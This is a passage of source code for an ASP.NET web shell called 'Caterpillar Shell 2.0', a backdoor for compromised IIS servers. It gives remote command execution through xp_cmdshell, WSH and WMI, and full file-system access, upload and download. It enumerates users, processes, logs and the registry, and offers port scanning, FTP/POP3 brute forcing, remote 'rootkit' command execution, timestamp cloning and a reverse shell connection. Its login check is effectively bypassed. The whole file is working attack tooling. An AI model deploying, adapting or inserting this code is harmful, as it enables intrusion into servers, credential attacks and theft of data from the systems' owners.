                            Number_Of_Records = CDbl(UBound(arrResults, 2))
                            strResult = "<table border='3' width ='' height=''><tr bgcolor=black>"
                            For A = 0 To Number_Of_Fields
                                strResult += "<td align=center><font color=white><b>"
                                strResult += recResult.Fields(A).Name
                                strResult += "<b></font></td>"
                            Next
                            strResult += "</tr>"
                            For R = 0 To Number_Of_Records
                                strResult += "<tr>"
                                For F = 0 To Number_Of_Fields
                                    strResult += "<td>" & arrResults(F, R).ToString()
                                    strResult += "</td>"
                                Next
                                strResult += "</tr>"
                            Next
                            strResult += "</table>"
                        End If
                        recResult = Nothing
                        resultSQL.Text = Sqlcmd.Text & strResult
                        Sqlcmd.Text = ""
                    Else
                        strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"
                        recResult = adoConn.Execute(strQuery)
                        If Not recResult.EOF Then
                            Do While Not recResult.EOF
                                strResult = strResult & Chr(13) & recResult(0).value
                                recResult.MoveNext()
                            Loop
                        End If
                        recResult = Nothing
                        strResult = Replace(strResult, " ", "&nbsp;")
                        strResult = Replace(strResult, "<", "<")
                        strResult = Replace(strResult, ">", ">")
                        resultSQL.Text = Sqlcmd.Text & vbCrLf & "<pre>" & strResult & "</pre>"
                        Sqlcmd.Text = ""
                    End If
                Else
                    strQuery = "select @@version"
                    recResult = adoConn.Execute(strQuery)
                    If Not recResult.EOF Then
                        Do While Not recResult.EOF
                            strResult = strResult & Chr(13) & recResult(0).value
                            recResult.MoveNext()
                        Loop
                    End If
                    recResult = Nothing
                    strResult = Replace(strResult, " ", "&nbsp;")
                    strResult = Replace(strResult, "<", "<")
                    strResult = Replace(strResult, ">", ">")
                    strResult = Replace(strResult, "NT&nbsp;5.0", "2000")
                    strResult = Replace(strResult, "NT&nbsp;5.1", "XP")
                    strResult = Replace(strResult, "NT&nbsp;5.2", "2003")
                    strResult = Replace(strResult, "NT&nbsp;6.0", "2008")
                    strResult = Replace(strResult, "NT&nbsp;6.1", "7")
                    strQuery = "select @@servername"
                    recResult = adoConn.Execute(strQuery)
                    If Not recResult.EOF Then
                        Do While Not recResult.EOF
                            strResult = strResult & Chr(13) & "SERVERNAME=" & recResult(0).value
                            recResult.MoveNext()
                        Loop
                    End If
                    recResult = Nothing
                    resultSQL.Text = Sqlcmd.Text & vbCrLf & "<pre>" & strResult & "</pre>"
                    Sqlcmd.Text = ""
                End If
                adoConn.Close()
            Catch ex As Exception
                Dim Messerr As String = ex.Message
                If Messerr.IndexOf("procedure") <> -1 Then
                    resultSQL.Text = "<pre>This maybe MSDOS command Please Uncheck Sql query</pre>"
                Else
                    resultSQL.Text = "<pre>" & Messerr & "</pre>"
                End If
            End Try
            
        End If
    End Sub
    Function GetMimeType(ByVal fileName As String) As String
        Try
            Dim ext As String = System.IO.Path.GetExtension(fileName).ToLower()
            Dim regKey As RegistryKey = Registry.ClassesRoot.OpenSubKey(ext)
            Return regKey.GetValue("Content Type").ToString()
        Catch ex As Exception
            Return "application/unknown"
        End Try
        Return "application/unknown"
    End Function
    Function BuildByteArrayString(ByVal array As [Byte]()) As String
        Dim sb As New StringBuilder(Array.Length * 8)
        For Each currentByte As [Byte] In Array
            sb.AppendFormat("[0x{0:X4}]", currentByte)
        Next
        Return sb.ToString()
    End Function
    Function HexToString(ByVal HexToStr As String) As String
        Dim strTemp As String
        Dim strReturn As String = ""
        Dim I As Long
        For I = 1 To Len(HexToStr) Step 2
            strTemp = Chr(Val("&H" & Mid$(HexToStr, I, 2)))
            strReturn = strReturn & strTemp
        Next I
        Return strReturn
    End Function
    
    Sub RunDbManager(ByVal Src As Object, ByVal E As EventArgs)
        Response.Redirect(Request.ServerVariables("URL") & "?action=ReadDbManager&DbServerName=" & DbServerName.Text & "&DbDriver=" & DropDownDriver.SelectedItem.Value & "&DbDatabase=" & DbDatabase.Text & "&DbUserName=" & DbUserName.Text & "&DbPass=" & DbPass.Text)
    End Sub
    Function GetStartedTime(ByVal ms)
        GetStartedTime = CInt(ms / (1000 * 60 * 60))
    End Function
    Function getIP()
        Dim strIPAddr As String
        If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" Or InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
            strIPAddr = Request.ServerVariables("REMOTE_ADDR")
        ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
            strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") - 1)
        ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
            strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") - 1)
        Else
            strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
        End If
        getIP = Trim(Mid(strIPAddr, 1, 30))
    End Function
    Function Getparentdir(ByVal nowdir)
        Dim temp, k As Integer
        temp = 1
        k = 0
        If Len(nowdir) > 4 Then
            nowdir = Left(nowdir, Len(nowdir) - 1)
        End If
        Do While temp <> 0
            k = temp + 1
            temp = InStr(temp, nowdir, "\")
            If temp = 0 Then
                Exit Do
            End If
            temp = temp + 1
        Loop
        If k <> 2 Then
            Getparentdir = Mid(nowdir, 1, k - 2)
        Else
            Getparentdir = nowdir
        End If
    End Function
    Function Rename()
        url = Request.QueryString("src")
        If File.Exists(Getparentdir(url) & Request.Form("name")) Then
            Rename = 0
        Else
            File.Copy(url, Getparentdir(url) & Request.Form("name"))
            del(url)
            Rename = 1
        End If
    End Function
    Function GetSize(ByVal temp)
        If temp < 1024 Then
            GetSize = temp & " bytes"
        Else
            If temp \ 1024 < 1024 Then
                GetSize = temp \ 1024 & " KB"
            Else
                If temp \ 1024 \ 1024 < 1024 Then
                    GetSize = temp \ 1024 \ 1024 & " MB"
                Else
                    GetSize = temp \ 1024 \ 1024 \ 1024 & " GB"
                End If
            End If
        End If
    End Function
    Sub downTheFile(ByVal thePath)
        Dim stream
        stream = Server.CreateObject("adodb.stream")
        stream.open()
        stream.type = 1
        stream.loadFromFile(thePath)
        Response.AddHeader("Content-Disposition", "attachment; filename=" & Replace(Server.UrlEncode(Path.GetFileName(thePath)), "+", " "))
        Response.AddHeader("Content-Length", stream.Size)
        Response.Charset = "UTF-8"
        Response.ContentType = "application/octet-stream"
        Response.BinaryWrite(stream.read)
        Response.Flush()
        stream.close()
        stream = Nothing
        Response.End()
    End Sub
    'H T M L  S N I P P E T S
    Public Sub Newline()
        Response.Write("<BR>")
    End Sub
	
    Public Sub TextNewline()
        Response.Write(vbNewLine)
    End Sub

    Public Sub rw(ByVal text_to_print)      ' Response.write
        Response.Write(text_to_print)
    End Sub

    Public Sub rw_b(ByVal text_to_print)
        rw("<b>" + text_to_print + "</b>")
    End Sub

    Public Sub hr()
        rw("<hr>")
    End Sub

    Public Sub ul()
        rw("<ul>")
    End Sub

    Public Sub _ul()
        rw("</ul>")
    End Sub

    Public Sub table(ByVal border_size, ByVal width, ByVal height)
        rw("<table border='" + CStr(border_size) + "' width ='" + CStr(width) + "' height='" + CStr(height) + "'>")
    End Sub

    Public Sub _table()
        rw("</table>")
    End Sub

    Public Sub tr()
        rw("<tr>")
    End Sub

    Public Sub _tr()
        rw("</tr>")
    End Sub

    Public Sub td()
        rw("<td>")
    End Sub

    Public Sub _td()
        rw("</td>")
    End Sub

    Public Sub td_span(ByVal align, ByVal name, ByVal contents)
        rw("<td align=" + align + "><span id='" + name + "'>" + contents + "</span></td>")
    End Sub

    Public Sub td_link(ByVal align, ByVal title, ByVal link, ByVal target)
        rw("<td align=" + align + "><a href='" + link + "' target='" + target + "'>" + title + "</a></td>")
    End Sub

    Public Sub link(ByVal title, ByVal link, ByVal target)
        rw("<a href='" + link + "' target='" + target + "'>" + title + "</a>")
    End Sub

    Public Sub link_hr(ByVal title, ByVal link, ByVal target)
        rw("<a href='" + link + "' target='" + target + "'>" + title + "</a>")
        hr()
    End Sub

    Public Sub link_newline(ByVal title, ByVal link, ByVal target)
        rw("<a href='" + link + "' target='" + target + "'>" + title + "</a>")
        Newline()
    End Sub
	
    Public Sub empty_Cell(ByVal ColSpan)
        rw("<td colspan='" + CStr(ColSpan) + "'></td>")
    End Sub

    Public Sub empty_row(ByVal ColSpan)
        rw("<tr><td colspan='" + CStr(ColSpan) + "'></td></tr>")
    End Sub

    Public Sub Create_table_row_with_supplied_colors(ByVal bgColor, ByVal fontColor, ByVal alignValue, ByVal rowItems)
        Dim rowItem

        rowItems = Split(rowItems, ",")
        Response.Write("<tr bgcolor=" + bgColor + ">")
        For Each rowItem In rowItems
            Response.Write("<td align=" + alignValue + "><font color=" + fontColor + "><b>" + rowItem + "<b></font></td>")
        Next
        Response.Write("</tr>")

    End Sub

    Public Sub TR_TD(ByVal cellContents)
        Response.Write("<td>")
        Response.Write(cellContents)
        Response.Write("</td>")
    End Sub
	

    Public Sub Surround_by_TD(ByVal cellContents)
        Response.Write("<td>")
        Response.Write(cellContents)
        Response.Write("</td>")
    End Sub

    Public Sub Surround_by_TD_and_Bold(ByVal cellContents)
        Response.Write("<td><b>")
        Response.Write(cellContents)
        Response.Write("</b></td>")
    End Sub

    Public Sub Surround_by_TD_with_supplied_colors_and_bold(ByVal bgColor, ByVal fontColor, ByVal alignValue, ByVal cellContents)
        Response.Write("<td align=" + alignValue + " bgcolor=" + bgColor + " ><font color=" + fontColor + "><b>")
        Response.Write(cellContents)
        Response.Write("</b></font></td>")
    End Sub
    Public Sub Create_background_Div_table(ByVal title, ByVal main_cell_contents, ByVal top, ByVal left, ByVal width, ByVal height, ByVal z_index)
        Response.Write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: " + width + "; height: " + height + "; z-index: " + z_index + "'>")
        Response.Write("  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse' bordercolor='#111111' width='100%' id='AutoNumber1' height='100%'>")
        Response.Write("    <tr heigth=20>")
        Response.Write("      <td bgcolor='black' align=center><font color='white'><b>" + title + "</b></font></td>")
        Response.Write("    </tr>")
        Response.Write("    <tr>")
        Response.Write("      <td>" + main_cell_contents + "</td>")
        Response.Write("    </tr>")
        Response.Write("  </table>")
        Response.Write("</div>")
    End Sub

    Public Sub Create_Div_open(ByVal top, ByVal left, ByVal width, ByVal height, ByVal z_index)
        Response.Write("<div style='border-style:solid; border-width:1px; overflow: scroll; top: " + top + "; left: " + left + "; width: " + width + "; height: " + height + "; z-index: " + z_index + "'>")
    End Sub


    Public Sub Create_Div_close()
        Response.Write("</div>")
    End Sub

    Public Sub Create_Iframe(ByVal left, ByVal top, ByVal width, ByVal height, ByVal name, ByVal src)
        rw("<span style='position: absolute; left: " + left + "; top: " + top + "'>")
        rw("	<iframe name='" + name + "' src='" + src + "' width='" + CStr(width) + "' height='" + CStr(height) + "'></iframe>")
        rw("</span>")
    End Sub

    Public Sub Create_Iframe_relative(ByVal width, ByVal height, ByVal name, ByVal src)
        rw("	<iframe name='" + name + "' src='" + src + "' width='" + CStr(width) + "' height='" + CStr(height) + "'></iframe>")
    End Sub

    Public Sub return_100_percent_table()
        rw("<table border width='100%' height='100%'><tr><td>sdf</td></tr></table>")
    End Sub

    Public Sub font_size(ByVal size)
        rw("<font size=" + size + ">")
    End Sub

    Public Sub end_font()
        rw("</font>")
    End Sub

    Public Sub red(ByVal contents)
        rw("<font color=red>" + contents + "</font>")
    End Sub

    Public Sub yellow(ByVal contents)
        rw("<font color='#FF8800'>" + contents + "</font>")
    End Sub

    Public Sub green(ByVal contents)
        rw("<font color=green>" + contents + "</font>")
    End Sub
    Public Sub print_var(ByVal var_name, ByVal var_value, ByVal var_description)
        If var_description <> "" Then
            rw(b_(var_name) + " : " + var_value + i_("  (" + var_description + ")"))
        Else
            rw(b_(var_name) + " : " + var_value)
        End If
        Newline()
    End Sub

    ' Functions

    Public Function br_()
        br_ = "<br>"
    End Function

    Public Function b_(ByVal contents)
        b_ = "<b>" + contents + "</b>"
    End Function

    Public Function i_(ByVal contents)
        i_ = "<i>" + contents + "</i>"
    End Function

    Public Function li_(ByVal contents)
        li_ = "<li>" + contents + "</li>"
    End Function

    Public Function h1_(ByVal contents)
        h1_ = "<h1>" + contents + "</h1>"
    End Function

    Public Function h2_(ByVal contents)
        h2_ = "<h2>" + contents + "</h2>"
    End Function

    Public Function h3_(ByVal contents)
        h3_ = "<h3>" + contents + "</h3>"
    End Function

    Public Function big_(ByVal contents)
        big_ = "<big>" + contents + "</big>"
    End Function

    Public Function center_(ByVal contents)
        center_ = "<center>" + CStr(contents) + "</center>"
    End Function


    Public Function td_force_width_(ByVal width)
        td_force_width_ = "<br><img src='' height=0 width=" + CStr(width) + " border=0>"
    End Function


    Public Function red_(ByVal contents)
        red_ = "<font color=red>" + contents + "</font>"
    End Function

    Public Function yellow_(ByVal contents)
        yellow_ = "<font color='#FF8800'>" + contents + "</font>"
    End Function

    Public Function green_(ByVal contents)
        green_ = "<font color=green>" + contents + "</font>"
    End Function

    Public Function link_(ByVal title, ByVal link, ByVal target)
        link_ = "<a href='" + link + "' target='" + target + "'>" + title + "</a>"
    End Function
    'End HTML SNIPPETS	
</script>
<%
    If Request.QueryString("action") = "down" And Session("caterpillar") = 1 Then
        downTheFile(Request.QueryString("src"))
        Response.End()
    End If  
    Dim hu As String = Request.QueryString("action")
    If hu = "cmd" Then
        TITLE = "CMD.NET"
    ElseIf hu = "cmdw32" Then
        TITLE = "ASP.NET W32 Shell"
    ElseIf hu = "cmdwsh" Then
        TITLE = "ASP.NET WSH Shell"
    ElseIf hu = "cmdwmi" Then
        TITLE = "ASP.NET WMI Shell"
    ElseIf hu = "sqlrootkit" Then
        TITLE = "SqlRootKit.NET"
    ElseIf hu = "PortScan" Then
        TITLE = "Port Scan"
    ElseIf hu = "FtpBrute" Then
        TITLE = "Ftp Brute"
    ElseIf hu = "POP3Brute" Then
        TITLE = "POP3 Brute"
    ElseIf hu = "UserEnumLogin" Then
        TITLE = "User Enum Login"
    ElseIf hu = "clonetime" Then
        TITLE = "Clone Time"
    ElseIf hu = "information" Then
        TITLE = "Web Server Info"
    ElseIf hu = "goto" Then
        TITLE = "CaterPillar-Shell 2.0"
	ElseIf hu = "adminrk" Then
        TITLE = "Admin Root Kit"
    ElseIf hu = "pro" Then
        TITLE = "List processes from server"
    ElseIf hu = "regshell" Then
        TITLE = "Registry Shell"
	ElseIf hu = "DbManager" Then
        TITLE = "Data Base Manager"
    ElseIf hu = "user" Then
        TITLE = "List User Accounts"
    ElseIf hu = "applog" Then
        TITLE = "List Application Event Log Entries"
    ElseIf hu = "syslog" Then
        TITLE = "List System Event Log Entries"
    ElseIf hu = "auser" Then
        TITLE = "IIS List Anonymous"
    ElseIf hu = "ipconfig" Then
        TITLE = "Ip Config"
    ElseIf hu = "localgroup" Then
        TITLE = "Local Group"
    Else
        TITLE = Request.ServerVariables("HTTP_HOST")
    End If
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<style type="text/css">
body,td,th {
	color: #000000;
	font-family: Verdana;
}
body {
	background-color: #ffffff;
	font-size:12px; 
}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.style3 {color: #FF0000}
</style>
<head>
<meta http-equiv="Content-Type" content="text/html">
<title><%=TITLE%></title>
</head>
<body>
<div align="center">Caterpillar Shell 2.0 By N.T</div>
<hr>
<%Session("caterpillar") = 1%>
<%
Dim error_x as Exception
Try
        If Session("caterpillar") <> 1 Then
            'response.Write("<br>")
            'response.Write("Hello , thank you for using my program !<br>")
            'response.Write("This program is run at ASP.NET Environment and manage the web directory.<br>")
            'response.Write("Maybe this program looks like a backdoor , but I wish you like it and don't hack :p<br><br>")
            'response.Write("<span class=""style3"">Notice:</span> only click ""Login"" to login.")
%>
<form id="FormLogin" runat="server">
  User Name:<asp:TextBox ID="TextBoxUserName" runat="server" class="TextBox" />  
  Password:<asp:TextBox ID="TextBoxPassword" runat="server"  class="TextBox" />  
  <asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="Login_click" class="buttom" />
</form> 
<%
else
    Dim temp As String
    Dim username As String
    Dim password As String
    temp = Request.QueryString("action")
    username = Request.QueryString("username")
    password = Request.QueryString("password")
    
    ht = Request.QueryString("ht")
    us = Request.QueryString("us")
    pa = Request.QueryString("pa")
    
    If username <> "" And password <> "" Then
        If impersonateValidUser(username, ".", password) Then
            
        Else
            
        End If
    End If
    If temp = "" Then temp = "goto"
    Select Case temp
        Case "goto"         
            If Request.QueryString("src") <> "" Then
                url = Request.QueryString("src")
            Else
                url = Server.MapPath(".") & "\"
            End If
            Call existdir(url)
            Dim xdir As DirectoryInfo
            Dim mydir As New DirectoryInfo(url)
            Dim hupo As String
            Dim xfile As FileInfo
%>
<table width="100%"  border="0" align="center">
  <tr>
  	<td>Currently Dir:</td> <td><font color=red><%=url%></font></td>
  </tr>
  <tr>
    <td width="13%">Operate:</td>
    <td width="87%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory">New</a> - 
      <%if session("cutboard")<>"" then%>
      <a href="?action=paste&src=<%=server.UrlEncode(url)%>" title="you can paste">Paste</a> - 
      <%else%>
	Paste - 
<%end if%>
<a href="?action=search&src=<%=server.UrlEncode(url)%>" title="Search File">Search</a> - <a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file">UpLoad</a> - <a href="?action=downloadfileRemote&src=<%=server.UrlEncode(url)%>" title="Download file Remote">Download Remote</a> - <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">GoBackDir </a> - <a href="?action=goto&src=C%3a%5cProgram%20Files%5c" title="Program Files">Program Files</a> - <a href="?action=goto&src=C%3a%5cDocuments%20and%20Settings%5c" title="Documents and Settings">Documents and Settings</a>  - <a href="?action=goto&src=C%3a%5cwindows%5cTemp%5c" title="Temp">Temp</a> - <a href="?action=logout" title="Exit">Quit</a></td>



  </tr>
  <tr>
    <td>
	Go to: </td>
    <td>
<%
dim i as integer
for i =0 to Directory.GetLogicalDrives().length-1
 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
next
%>
</td>
  </tr>
  
  <tr>
    <td>Data Base:</td>
    <td><a href="?action=DbManager" >Dbase Manager</a> - <a href="?action=DbEnumerateLogin" >User SQL Enum Login</a></td>    
  </tr>

  <tr>
    <td>Tool:</td>
    <td><a href="?action=sqlrootkit" >SqlRootKit.NET </a> - <a href="?action=adminrk" >AdminRootKit</a>  - <a href="?action=cmd" >CMD.NET</a>  - <a href="?action=PortScan" >Port Scan</a> - <a href="?action=FtpBrute" >Ftp Brute</a> - <a href="?action=POP3Brute" >POP3 Brute</a> - <a href="?action=UserEnumLogin" >User Enum Login</a> - <a href="?action=cmdw32" >CMD.W32</a> - <a href="?action=cmdwsh" >CMD.WSH</a> - <a href="?action=cmdwmi" >CMD.WMI</a></td>
  </tr>
  <tr>
    <td></td>
    <td><a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" >CloneTime</a> - <a href="?action=information" >System Info</a> - <a href="?action=pro" >List Processes</a> - <a href="?action=srv" >List Services</a> - <a href="?action=regshell" >Registry Shell</a></td>    
  </tr>
  <tr>
    <td> </td>
    <td><a href="?action=applog" >Application Event Log </a> - <a href="?action=user" >List User Accounts</a> - <a href="?action=syslog" >System Log</a> - <a href="?action=auser" >IIS List Anonymous</a> - <a href="?action=iisspy" >IIS Spy</a> - <a href="?action=ipconfig" >Ip Config</a> - <a href="?action=localgroup" >Local Group</a> - <a href="?action=homedirectory" >User Home Directory </a></td>    
  </tr>
  <tr>
  <td> </td>
    <td><a href="?action=HttpFinger" >Http Finger </a> - <a href="?action=GetNTPC" >GetNetworkComputers </a> - <a href="?action=FtpSwitch" >Ftp Switch</a> - <a href="?action=RvConnect&src=<%=server.UrlEncode(url)%>" >Shell Connection</a></td>
    </tr>
</table>
<hr>
<table width="100%"  border="0" align="center">
	<tr>
	<td width="30%"><strong>Name</strong></td>
	<td width="10%"><strong>Size</strong></td>
	<td width="20%"><strong>Type</strong></td>
	<td width="20%"><strong>ModifyTime</strong></td>
	<td width="25%"><strong>Operate</strong></td>
	</tr>
      <tr>
        <td><%
                hupo = "<tr><td><img src='?action=Showicon&Image=parent' /><a href='?action=goto&src=" & Server.UrlEncode(Getparentdir(url)) & "'><i>|Parent Directory|</i></a></td></tr>"
                Response.Write(hupo)
                For Each xdir In mydir.GetDirectories()
                    Response.Write("<tr>")
                    Dim filepath As String
                    filepath = Server.UrlEncode(url & xdir.Name)
                    hupo = "<td><img src='?action=Showicon&Image=folder' /><a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.Name & "</a></td>"
                    Response.Write(hupo)
                    Response.Write("<td><dir></td>")
                    Response.Write("<td><dir></td>")
                    Response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.Name) & "</td>")
                    hupo = "<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>Del</a></td>"
                    Response.Write(hupo)
                    Response.Write("</tr>")
                Next
		%></td>
  </tr>
		<tr>
        <td><%
                For Each xfile In mydir.GetFiles()
                    Dim filepath2 As String
                    filepath2 = Server.UrlEncode(url & xfile.Name)
                    Response.Write("<tr>")
                    'hupo = "<td>" & xfile.Name & "</td>"
                    hupo = "<td><img src='?action=Showicon&Image=" & xfile.Extension.ToLower() & "' /><a href='?action=view&src=" & filepath2 & "'>" & xfile.Name & "</a></td>"
                    Response.Write(hupo)
                    hupo = "<td>" & GetSize(xfile.Length) & "</td>"
                    Response.Write(hupo)
                    hupo = "<td>" & GetMimeType(xfile.Name) & "</td>"
                    Response.Write(hupo)
                    Response.Write("<td>" & File.GetLastWriteTime(url & xfile.Name) & "</td>")
                    If xfile.Extension <> ".mdb" Then
                        hupo = "<td><a href='?action=edit&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
                    Else
                        hupo = "<td><a href='?action=ReadDbManager&DbDatabase=" & filepath2 & "&DbDriver=Microsoft.Jet.OLEDB.4.0" & "'><b>View</b></a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
                    End If
                    Response.Write(hupo)
                    Response.Write("</tr>")
                Next
                Response.Write("</table>")
       %></td>
      </tr>
</table>
<script language="javascript">
function down()
{
if(confirm("If the file size > 20M,\nPlease don\'t download\nYou can copy file to web directory ,use http download\nAre you sure download?")){return true;}
else{return false;}
}
</script>
<%
case "information"
	dim CIP,CP as string
	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
			CIP=getIP()
			CP=request.ServerVariables("REMOTE_ADDR")
	else
			CIP=request.ServerVariables("REMOTE_ADDR")
			CP="None"
	end if
%>
<div align=center>[ Web Server Information ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></div><br>
<table width="80%"  border="1" align="center">
  <tr>
    <td width="40%">Server IP</td>
    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr>
    <td height="73">Machine Name</td>
    <td><%=Environment.MachineName%></td>
  </tr>
  <tr>
    <td>Network Name</td>
    <td><%=Environment.UserDomainName.ToString()%></td>
  </tr>
  <tr>
    <td>User Name in this Process</td>
    <td><%=Environment.UserName%></td>
  </tr>
  <tr>
    <td>OS Version</td>
    <td><%=Environment.OSVersion.ToString()%></td>
  </tr>
  <tr>
    <td>Started Time</td>
    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
  </tr>
  <tr>
    <td>System Time</td>
    <td><%=now%></td>
  </tr>
  <tr>
    <td>IIS Version</td>
    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr>
    <td>HTTPS</td>
    <td><%=request.ServerVariables("HTTPS")%></td>
  </tr>
  <tr>
    <td>PATH_INFO</td>
    <td><%=request.ServerVariables("PATH_INFO")%></td>
  </tr>
  <tr>
    <td>PATH_TRANSLATED</td>
    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
  <tr>
    <td>SERVER_PORT</td>
    <td><%=request.ServerVariables("SERVER_PORT")%></td>
  </tr>
    <tr>
    <td>SeesionID</td>
    <td><%=Session.SessionID%></td>
  </tr>
  <tr>
    <td colspan="2"><span class="style3">Client Infomation</span></td>
  </tr>
  <tr>
    <td>Client Proxy</td>
    <td><%=CP%></td>
  </tr>
  <tr>
    <td>Client IP</td>
    <td><%=CIP%></td>
  </tr>
  <tr>
    <td>User</td>
    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
  </tr>
</table>
<table align=center>
	<% Create_table_row_with_supplied_colors("Black", "White", "center", "Environment Variables, Server Variables") %>
	<tr>
		<td><textArea cols=50 rows=10><% output_all_environment_variables("text") %></textarea></td>
		<td><textArea cols=50 rows=10><% output_all_Server_variables("text") %></textarea></td>
	</tr>
</table>
<%
Case "HttpFinger"
%>
<form id="Form232" runat="server">
  <p>[ Http Finger for WebAdmin ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Http Finger with ASP.NET account(<span class="style3">Notice: only click "Start" to Finger Print</span>)</p>
  <p>- This function has fixed by zablah has not detected (2009/04/17)-</p>
  <p>
      Hostname/IP: 
      <asp:TextBox ID="HttpFingerIp" runat="server" Width="209px" class="TextBox" Text="127.0.0.1"/>
      &nbsp;
       
      <asp:Button ID="ButtonHttpFinger" runat="server" Text="Start" OnClick="HttpFinger" class="buttom"/>  </p>
  <p>
   <asp:Label ID="resultHttpFinger" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "adminrk"
%>
<form id="FormAdminRK" runat="server">
  <p>[ AdminRootKit for CaterPillar ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Execute command To Remote Server account(<span class="style3">Notice: only click "Run" to run</span>)</p>
  <p>Host Name:
    <asp:TextBox ID="HostRootKit" runat="server" style="width:200px;" Cssclass="TextBox" Text="127.0.0.1"/>
    Driver:<asp:DropDownList ID="DropDownService" runat="server" style="width:200px;" Cssclass="TextBox">
          <asp:ListItem Value="homedirectory">Win32_User</asp:ListItem>
          <asp:ListItem Value="W3SVC">IIsWebServer</asp:ListItem>
          <asp:ListItem Value="MSFTPSVC">IIsFtpServer</asp:ListItem>
          <asp:ListItem Value="NNTPSVC">IIsNNTPServer</asp:ListItem>
          <asp:ListItem Value="srv">Win32_Service</asp:ListItem>
          <asp:ListItem Value="pro">Win32_Process</asp:ListItem>
          <asp:ListItem Value="user">Win32_UserAccount</asp:ListItem>
          <asp:ListItem Value="cmd">Win32_CMD</asp:ListItem>
      </asp:DropDownList></p>
   <p>
  User Name:
    <asp:TextBox ID="UserRootKit" runat="server" style="width:200px;" Cssclass="TextBox" Text='Administrator'/>
  Password:
  <asp:TextBox ID="PasswordRootKit" runat="server" style="width:200px;" Cssclass="TextBox"/>
  </p>
  Command:&nbsp;
  <asp:TextBox ID="CmdRK" runat="server" style="width:480px;" Cssclass="TextBox"/>
  <asp:Button ID="ButtonRootKit" runat="server" Text="Run" OnClick="RunAdminRK" Cssclass="buttom"/>  
  <p>
   <asp:Label ID="LabelRootKit" runat="server" style="style2"/>      </p>
</form>
<%
case "iisspy"
%>
	<p align=center>[ IIS Spy ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<% 
				Try
				Response.write(IISSpy())
				Catch
				rw("This function is disabled by server")
				End Try
	%>
<%
	case "PortScan"
%>
<form id="Form3" runat="server">
  <p>[ Scan Port &nbsp;for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Port Scan with ASP.NET account(<span class="style3">Notice: only click "Scan" to san port</span>)</p>
  <p>- This function has fixed by zero lord has not detected (2008/03/27)-</p>
  <p>Host:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <asp:TextBox ID="IpScan" runat="server" style="width:150px;" class="TextBox" Text="127.0.0.1"/></p>
  <p>Port List: 
  <asp:TextBox ID="PortScan" runat="server" style="width:400px;" class="TextBox" Text="21,23,25,80,110,135,139,445,1433,3389,3306,43958"/> 
  <asp:Button ID="ButtonPortScan" runat="server" Text="Scan" OnClick="RunPortScan" class="buttom"/>  
  </p>  
  <p>
   <asp:Label ID="resultPortScan" runat="server" style="style2"/>      </p>
</form>

<%
Case "POP3Brute"
%>
<form id="Form1" runat="server">
  <p>[ Ftp Brute &nbsp;for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Ftp Brute with ASP.NET account(<span class="style3">Notice: only click "Start" to start brute</span>)</p>
